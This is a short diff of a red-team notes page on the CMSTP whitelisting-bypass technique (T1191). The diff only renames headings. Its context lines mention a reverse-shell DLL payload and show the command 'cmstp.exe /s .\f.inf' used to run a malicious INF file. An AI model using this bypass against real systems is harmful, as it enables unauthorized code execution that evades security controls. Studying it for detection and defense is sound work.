@@ -4,7 +4,7 @@ description: CSMTP code execution - bypass application whitelisting.
 
 # T1191: CSMTP
 
-## Code
+## Execution
 
 Generating evil payload as a DLL - a reverse shell:
 
@@ -39,7 +39,7 @@ ShortSvcName="mantvydas"
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-## Execution
+Carrying out the execution attack:
 
 ```bash
 PS C:\experiments\cmstp> cmstp.exe /s .\f.inf
